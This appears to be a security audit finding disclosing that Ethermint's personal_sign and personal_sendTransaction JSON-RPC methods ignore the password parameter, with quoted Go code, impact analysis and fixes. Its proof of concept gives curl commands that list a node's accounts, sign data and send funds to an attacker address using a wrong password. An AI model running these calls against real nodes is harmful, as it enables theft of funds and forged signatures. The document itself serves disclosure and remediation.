### Title
Password Authentication Bypass in `personal_sign` and `personal_sendTransaction` JSON-RPC Methods — (File: `rpc/namespaces/ethereum/personal/api.go`)

---

### Summary

The `personal_sign` and `personal_sendTransaction` JSON-RPC methods accept a `password` parameter per the Ethereum `personal_` namespace specification, but **silently discard it** using the blank identifier `_`. Any caller who can reach the JSON-RPC endpoint can sign arbitrary data or broadcast transactions from any account held in the node's keyring without supplying the correct password. This is a direct authentication bypass enabling unauthorized transaction execution and fund transfer.

---

### Finding Description

The Ethereum `personal_` namespace is designed so that signing operations require the caller to supply the account's decryption password. In Ethermint's implementation, both `personal_sign` and `personal_sendTransaction` accept the password argument in their function signatures but immediately discard it:

**`personal_sign`** — `rpc/namespaces/ethereum/personal/api.go`, line 145:
```go
func (api *PrivateAccountAPI) Sign(_ context.Context, data hexutil.Bytes, addr common.Address, _ string) (hexutil.Bytes, error) {
    api.logger.Debug("personal_sign", "data", data, "address", addr.String())
    return api.backend.Sign(addr, data)
}
```
The third parameter `_ string` is the password. It is discarded. `api.backend.Sign(addr, data)` is called unconditionally. [1](#0-0) 

**`personal_sendTransaction`** — `rpc/namespaces/ethereum/personal/api.go`, line 131:
```go
func (api *PrivateAccountAPI) SendTransaction(_ context.Context, args evmtypes.TransactionArgs, _ string) (common.Hash, error) {
```

The second `_ string` is the password. It is discarded. `api.backend.SendTransaction(args)` is called unconditionally. [2](#0-1) 

The downstream `Backend.Sign` and `Backend.SendTransaction` functions in `rpc/backend/sign_tx.go` perform no password check either — they call `b.clientCtx.Keyring.SignByAddress(...)` directly: [3](#0-2) [4](#0-3) 

The docstring for `Sign` even states *"The key used to calculate the signature is decrypted with the given password"*, but no such decryption occurs. [5](#0-4) 

---

### Impact Explanation

Any caller who can reach the JSON-RPC port (default `8545`) can:

1. **Sign arbitrary data** as any account in the node's keyring via `personal_sign` — with any password or an empty string.
2. **Broadcast signed Ethereum transactions** from any account in the node's keyring via `personal_sendTransaction` — transferring EVM-denom funds, deploying contracts, or calling arbitrary contract methods — without knowing the account's password.

This satisfies two allowed impact categories:
- **Critical**: Unauthorized transfer of EVM-denom funds through `personal_sendTransaction` without password authentication.
- **High**: Signer verification bypass enabling forged execution via `personal_sign` (e.g., signing EIP-712 typed data, authorization messages, or off-chain approvals).

---

### Likelihood Explanation

The JSON-RPC endpoint is the primary user-facing interface for Ethermint. Nodes that expose the `personal` namespace (enabled via `--json-rpc.api` configuration) are directly vulnerable. The `personal_` namespace is explicitly registered and served: [6](#0-5) 

Any network-reachable client — including a dApp frontend, a compromised browser, or a local process — can exploit this with a single JSON-RPC call. No special privileges, leaked keys, or chain-level access are required. The attacker only needs to know the target account address (publicly derivable from `personal_listAccounts` or `eth_accounts`).

---

### Recommendation

1. **Enforce password verification before signing.** The `personal_sign` and `personal_sendTransaction` handlers must pass the supplied password to the keyring's key-decryption step before invoking `SignByAddress`. The password should be used to export and decrypt the private key material, perform the signing, and then discard the plaintext key — matching the behavior of go-ethereum's reference implementation.

2. **Do not use blank `_` for security-critical parameters.** Replace `_ string` with a named `password string` parameter and propagate it through `Backend.Sign` and `Backend.SendTransaction`.

3. **Consider disabling the `personal_` namespace by default** or gating it behind an explicit opt-in flag, as go-ethereum does, given the inherent risk of exposing key-management operations over HTTP/WebSocket.

---

### Proof of Concept

```bash
# 1. Discover accounts in the node's keyring (no auth required)
curl -s -X POST http://localhost:8545 \
  -H "Content-Type: application/json" \
  -d '{"jsonrpc":"2.0","method":"personal_listAccounts","params":[],"id":1}'
# Returns: {"result":["0xABCD..."]}

# 2. Sign arbitrary data as that account — with a WRONG password (or empty string)
curl -s -X POST http://localhost:8545 \
  -H "Content-Type: application/json" \
  -d '{"jsonrpc":"2.0","method":"personal_sign","params":["0xdeadbeef","0xABCD...","wrongpassword"],"id":2}'
# Returns a valid ECDSA signature — password was never checked

# 3. Send a transaction transferring funds — with a WRONG password
curl -s -X POST http://localhost:8545 \
  -H "Content-Type: application/json" \
  -d '{"jsonrpc":"2.0","method":"personal_sendTransaction","params":[{"from":"0xABCD...","to":"0xATTACKER...","value":"0xDE0B6B3A7640000"},"wrongpassword"],"id":3}'
# Returns a transaction hash — funds transferred without password verification
```

```go
// SendTransaction sends transaction based on received args using Node's key to sign it
func (b *Backend) SendTransaction(args evmtypes.TransactionArgs) (common.Hash, error) {
	// Look up the wallet containing the requested signer
	_, err := b.clientCtx.Keyring.KeyByAddress(sdk.AccAddress(args.GetFrom().Bytes()))
	if err != nil {
		b.logger.Error("failed to find key in keyring", "address", args.GetFrom(), "error", err.Error())
		return common.Hash{}, fmt.Errorf("failed to find key in the node's keyring; %s; %s", keystore.ErrNoMatch, err.Error())
	}

	if args.ChainID != nil && (b.chainID).Cmp((*big.Int)(args.ChainID)) != 0 {
		return common.Hash{}, fmt.Errorf("chainId does not match node's (have=%v, want=%v)", args.ChainID, (*hexutil.Big)(b.chainID))
	}

	args, err = b.SetTxDefaults(args)
	if err != nil {
		return common.Hash{}, err
	}

	msg := args.ToTransaction()
	if err := msg.ValidateBasic(); err != nil {
		b.logger.Debug("tx failed basic validation", "error", err.Error())
		return common.Hash{}, err
	}

	bn, err := b.BlockNumber()
	if err != nil {
		b.logger.Debug("failed to fetch latest block number", "error", err.Error())
		return common.Hash{}, err
	}

	header, err := b.CurrentHeader()
	if err != nil {
		b.logger.Debug("failed to fetch latest block header", "error", err.Error())
		return common.Hash{}, err
	}

	signer := ethtypes.MakeSigner(b.ChainConfig(), new(big.Int).SetUint64(uint64(bn)), header.Time)

	// Sign transaction
	if err := msg.Sign(signer, b.clientCtx.Keyring); err != nil {
		b.logger.Debug("failed to sign tx", "error", err.Error())
		return common.Hash{}, err
	}
```

```go
// Sign signs the provided data using the private key of address via Geth's signature standard.
func (b *Backend) Sign(address common.Address, data hexutil.Bytes) (hexutil.Bytes, error) {
	from := sdk.AccAddress(address.Bytes())

	_, err := b.clientCtx.Keyring.KeyByAddress(from)
	if err != nil {
		b.logger.Error("failed to find key in keyring", "address", address.String())
		return nil, fmt.Errorf("%s; %s", keystore.ErrNoMatch, err.Error())
	}

	// Apply EIP-191 signed-message prefix to domain-separate personal
	// signatures from transaction signatures (matching Geth's eth_sign).
	signature, _, err := b.clientCtx.Keyring.SignByAddress(from, accounts.TextHash(data), signingtypes.SignMode_SIGN_MODE_TEXTUAL)
	if err != nil {
		b.logger.Error("keyring.SignByAddress failed", "address", address.Hex())
		return nil, err
	}

	signature[crypto.RecoveryIDOffset] += 27 // Transform V from 0/1 to 27/28 according to the yellow paper
	return signature, nil
}
```
